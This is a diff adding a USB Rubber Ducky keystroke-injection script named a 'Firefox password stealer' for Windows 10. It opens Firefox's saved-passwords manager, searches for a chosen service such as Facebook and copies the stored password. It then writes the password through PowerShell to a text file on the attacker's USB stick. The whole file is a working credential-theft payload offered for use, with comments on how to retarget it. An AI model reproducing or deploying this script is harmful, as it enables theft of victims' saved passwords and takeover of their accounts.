@@ -1,0 +1,75 @@
+REM Author: Tech Horizon
+REM Ducky Firefox password stealer: 2.1
+REM Target: Windows 10
+REM Description: Opens Firefox, navigates to saved passwords (a.k.a. Lockwise), searches for facebook (or any other service you may specify), copies password
+REM closes Firefox, opens Powershell, creates text file named FirefoxPassword.txt, pastes password, saves file to specified USB stick and closes Powershell
+
+REM ------------- Open Firefox -------------
+DELAY 2000
+GUI r
+DELAY 500
+STRING firefox
+DELAY 1000
+ENTER
+DELAY 4000
+REM ------------- Open password section (a.k.a. Lockwise) -------------
+TAB
+TAB
+RIGHT
+RIGHT
+RIGHT
+RIGHT
+ENTER
+DELAY 200
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+ENTER
+DELAY 1000
+REM ------------- Replace facebook with any other service you want to know the password of -------------
+STRING facebook
+DELAY 500
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+ENTER
+ALT F4
+DELAY 500
+ENTER
+DELAY 500
+
+REM ------------- save file to USB stick -------------
+REM make sure to change USB drive letter (yours might be different)
+
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+STRING Set-Content -Path "F:\FirefoxPassword.txt" -Value "
+CTRL v
+DELAY 500
+STRING " -Force
+DELAY 200
+ENTER
+DELAY 200
+ALT SPACE
+c
+
+REM -- You can now unplug the USB stick containing the FirefoxPassword.txt file --
